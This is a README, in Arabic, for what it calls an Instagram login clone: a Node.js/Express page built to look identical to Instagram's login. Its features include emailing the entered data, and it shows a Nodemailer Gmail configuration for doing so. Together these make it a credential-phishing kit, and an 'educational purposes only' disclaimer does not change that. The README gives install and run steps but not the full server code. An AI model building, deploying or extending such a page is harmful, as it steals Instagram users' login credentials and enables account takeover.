# Instagram Login Clone

صفحة تسجيل دخول Instagram وهمية مطورة باستخدام Node.js و Express.

## الميزات

- تصميم مطابق لصفحة Instagram الأصلية
- وضع داكن (Dark Mode)
- تصميم متجاوب (Responsive Design)
- إرسال البيانات عبر البريد الإلكتروني
- تحسينات UX/UI متقدمة
- معالجة الأخطاء والتحقق من صحة البيانات

## التقنيات المستخدمة

- **Backend**: Node.js, Express.js
- **Frontend**: HTML5, CSS3, JavaScript (Vanilla)
- **Email**: Nodemailer
- **Styling**: CSS Grid/Flexbox, Animations

## التثبيت والتشغيل

### المتطلبات
- Node.js (الإصدار 14 أو أحدث)
- npm أو yarn

### خطوات التثبيت

1. استنساخ المشروع:
```bash
git clone <repository-url>
cd instagram-login-clone
```

2. تثبيت التبعيات:
```bash
npm install
```

3. تشغيل الخادم:
```bash
npm start
```

4. فتح المتصفح والانتقال إلى:
```
http://localhost:3000
```

## إعداد البريد الإلكتروني

لتفعيل إرسال البيانات عبر البريد الإلكتروني، يجب تعديل الإعدادات في ملف `server.js`:

```javascript
const transporter = nodemailer.createTransporter({
  service: 'gmail',
  auth: {
    user: 'your-email@gmail.com',     // بريدك الإلكتروني
    pass: 'your-app-password'         // كلمة مرور التطبيق
  }
});
```

## هيكل المشروع

```
instagram-login-clone/
├── public/
│   ├── index.html          # الصفحة الرئيسية
│   └── style.css           # ملف التنسيقات
├── server.js               # خادم Express
├── package.json            # تبعيات المشروع
└── README.md              # هذا الملف
```

## الأمان

⚠️ **تحذير**: هذا المشروع مخصص للأغراض التعليمية فقط. لا تستخدمه لأغراض ضارة أو غير قانونية.

## الترخيص

MIT License

